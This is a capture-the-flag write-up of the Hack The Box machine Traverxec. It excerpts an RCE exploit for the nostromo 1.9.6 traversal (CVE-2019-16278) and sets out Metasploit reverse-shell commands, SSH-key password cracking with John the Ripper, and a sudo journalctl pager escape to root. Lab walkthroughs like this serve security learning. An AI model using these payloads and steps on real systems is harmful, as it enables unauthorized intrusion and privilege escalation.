@@ -1,0 +1,158 @@
+I"�&<p><strong><center>Ref°: HTB-03-Machine</center></strong></p>
+
+<p>— Traverxec is a Linux machine that highlights the exploitation of CVE through nostromo version 1.9.6 to gain first level access. Then allow the enumeration to escalate our privileges through a found and cracked backup ssh key. That to get Flag user.</p>
+
+<p>After that we find a script named “server-stats.sh” which allow to user David run especially command under root permission. To increase our privilege and gain root permission we use GTFOBin on journalctl and the execution of linux pager tool to allow the navigation in script result under root permission. That to get Flag root.</p>
+
+<p><img src="/assets/images/traverxec/HTB-Information-Traverxec.png" alt="Desktop View" /></p>
+
+<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
+<h3 id="check-all-services">Check all services</h3>
+<hr />
+
+<p>The nmap scan reveals <code class="language-plaintext highlighter-rouge">SSH</code> and <code class="language-plaintext highlighter-rouge">Apache</code> to be running on their usual ports.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nt">-T5</span> 10.10.10.165 <span class="nt">-p-</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/traverxec/HTB-Images-Traverxec-nmap.png" alt="Desktop View" /></p>
+
+<h3 id="web">Web</h3>
+<hr />
+
+<p>Nostromo run on the web service in version <code class="language-plaintext highlighter-rouge">1.9.6</code>.</p>
+
+<h3 id="vulnerabilities">Vulnerabilities</h3>
+<hr />
+
+<p>Here our target is Nostromo software. We check all vulnerabilities with metasploit and we find 2 vulnerabilities presents in our version.</p>
+
+<p>We are two CVE : 2019-16278 and 2019-16279. The first one is more interesting, it allow an RCE through directory transversal.</p>
+
+<h3 id="reviewing-code">Reviewing Code</h3>
+<hr />
+
+<p>Reference - exploit : <a href="https://www.exploit-db.com/exploits/47837">https://www.exploit-db.com/exploits/47837</a></p>
+
+<p>This issue is caused by a directory traversal in the function http_verify in nostromo nhttpd allowing an attacker to achieve remote code execution via a crafted HTTP request.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+def cve(target, port, cmd):
+    soc = socket.socket()
+    soc.connect((target, int(port)))
+    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2&gt;&amp;1'.format(cmd)
+    soc.send(payload)
+    receive = connect(soc)
+    print(receive)
+...
+</code></pre></div></div>
+
+<p>The execution of the RCE dont need to be authenticated or have an authenticated user.</p>
+
+<p>Metasploit module exists.</p>
+
+<h2 id="2-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2>
+<h3 id="obtaining-reverse-shell-from-cve-exploitation">Obtaining Reverse Shell from CVE Exploitation</h3>
+<hr />
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>msfconsole
+<span class="gp">msf5 &gt;</span><span class="w"> </span>search nostromo
+<span class="gp">msf5 &gt;</span><span class="w"> </span>use exploit/multi/http/nostromo_code_exec
+<span class="gp">msf5 &gt;</span><span class="w"> </span>show options
+<span class="gp">msf5 &gt;</span><span class="w"> </span><span class="nb">set </span>lhost 10.10.15.122
+<span class="gp">msf5 &gt;</span><span class="w"> </span><span class="nb">set </span>rhost 10.10.10.165
+<span class="gp">msf5 &gt;</span><span class="w"> </span>check
+<span class="gp">msf5 &gt;</span><span class="w"> </span>exploit
+</code></pre></div></div>
+
+<p><img src="/assets/images/traverxec/HTB-Images-Traverxec-rce.png" alt="Desktop View" /></p>
+
+<p>The exploitation is successful and we have gained a foothold.</p>
+
+<p>Let’s appear a pseudo-terminal with this command :</p>
+
+<p>Reference - pseudo-terminal : <a href="https://hacktion.be/reverse-shell-exercice/">https://hacktion.be/reverse-shell-exercice/</a></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/traverxec/HTB-Images-Traverxec-terminalonrce.png" alt="Desktop View" /></p>
+
+<h2 id="3-lateral-movement---move-through-environment"><strong><span style="color:#c0392b">[3] Lateral Movement - Move through environment</span></strong></h2>
+<h3 id="cracking-password">Cracking Password</h3>
+<hr />
+
+<p>Enum with www-data account and check the file /etc/passwd to find all system users : <code class="language-plaintext highlighter-rouge">David</code></p>
+
+<p>We find in nostromo folder a configuration file with reference of <code class="language-plaintext highlighter-rouge">public_www</code> folder below <code class="language-plaintext highlighter-rouge">/var/nostromo/conf/nhttpd.conf</code></p>
+
+<p><img src="/assets/images/traverxec/HTB-Images-Traverxec-publicfolder.png" alt="Desktop View" /></p>
+
+<p>We find <code class="language-plaintext highlighter-rouge">SSH Key</code> archive below <code class="language-plaintext highlighter-rouge">/home/david/public_www/protected-file-area</code></p>
+
+<p><img src="/assets/images/traverxec/HTB-Images-Traverxec-backupssh.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/traverxec/HTB-Images-Traverxec-backupssh2.png" alt="Desktop View" /></p>
+
+<p>We retrieve the private key to exploit it with JohnTheRipper on our attacking machine.</p>
+
+<p>Reference - johntheripper tool : <a href="https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c">https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c</a></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>./ssh2john.py ~/.ssh/David <span class="o">&gt;</span> David.hash
+<span class="gp">$</span><span class="w"> </span>/usr/sbin/john <span class="nt">--wordlist</span><span class="o">=</span>/root/Documents/wordlist/rockyou.txt David.hash
+</code></pre></div></div>
+
+<p><img src="/assets/images/traverxec/HTB-Images-Traverxec-jtr.png" alt="Desktop View" /></p>
+
+<p>We crack the password of the user David : <code class="language-plaintext highlighter-rouge">hunter</code></p>
+
+<h2 id="4-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[4] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
+<h3 id="gtfobins-abuse--shell-escaping">GTFOBins abuse &amp; Shell Escaping</h3>
+<hr />
+
+<p>We find bash script <code class="language-plaintext highlighter-rouge">server-stats.sh</code> below <code class="language-plaintext highlighter-rouge">/home/david/bin</code></p>
+
+<p><img src="/assets/images/traverxec/HTB-Images-Traverxec-scriptexec.png" alt="Desktop View" /></p>
+
+<p>David can execute this command under root privilege without password :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | usr/bin/cat
+</code></pre></div></div>
+
+<p><img src="/assets/images/traverxec/HTB-Images-Traverxec-script.png" alt="Desktop View" /></p>
+
+<p>Here we want stop the script under root privilege. To do this we use 2 techniques ; <code class="language-plaintext highlighter-rouge">GTFOBin Abuse</code> on journalctl and <code class="language-plaintext highlighter-rouge">Shell Escaping</code>.</p>
+
+<p>We copy the script to exploit the command line like we want.</p>
+
+<p>We delete the command <code class="language-plaintext highlighter-rouge">/usr/bin/cat</code> to avoid the result of the command.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">david@traverxec:~$</span><span class="w"> </span><span class="nb">cp </span>server-stats.sh private.sh
+<span class="gp">david@traverxec:~$</span><span class="w"> </span><span class="nb">chmod</span> +x private.sh
+<span class="gp">david@traverxec:~$</span><span class="w"> </span>nano private.sh -&gt; delete <span class="nb">command</span> /usr/bin/cat
+</code></pre></div></div>
+
+<p>Before launch our script, we need to resize our terminal to allow the execution of the pager linux tool.</p>
+
+<p>Reference - Shell Escaping : <a href="https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/">https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/</a></p>
+
+<p>“Linux pagers are simple utilities that allow us to see the output of a particular command or text file, that is too big to fit the screen, in a paged way. The most well known are more and less.”</p>
+
+<p>In this situation, the result of script that appears is larger than our terminal and allow the navigation of the document under root permission.</p>
+
+<p>We have the possibility to abusing of GTFOBin journalctl to appear a shell under root privilege with !/bin/sh</p>
+
+<p>Reference - journalctl GTFOBin : <a href="https://gtfobins.github.io/gtfobins/journalctl/">https://gtfobins.github.io/gtfobins/journalctl/</a></p>
+
+<p><img src="/assets/images/traverxec/HTB-Images-Traverxec-resizeterminal.png" alt="Desktop View" /></p>
+
+<hr />
+
+<h2 id="trophy"><strong><center>Trophy</center></strong></h2>
+
+<blockquote>
+  <p><strong>Everything is a copy of a copy of a copy.</strong></p>
+
+  <p>Chuck Palahniuk, Fight Club</p>
+</blockquote>
+:ET
